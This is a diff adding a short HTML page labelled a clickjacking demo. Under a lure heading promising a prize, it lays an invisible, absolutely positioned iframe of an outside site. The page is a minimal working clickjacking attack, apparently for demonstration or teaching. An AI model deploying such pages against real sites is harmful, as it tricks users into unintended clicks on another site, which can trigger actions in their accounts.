@@ -1,0 +1,9 @@
+<html>
+<head>
+    <title>Clickjacking Demo</title>
+</head>
+<body>
+    <h1>Click the button to win a prize!</h1>
+    <iframe src="https://targetwebsite.com" width="800" height="600" style="opacity: 0; position: absolute; top: 0; left: 0;"></iframe>
+</body>
+</html>
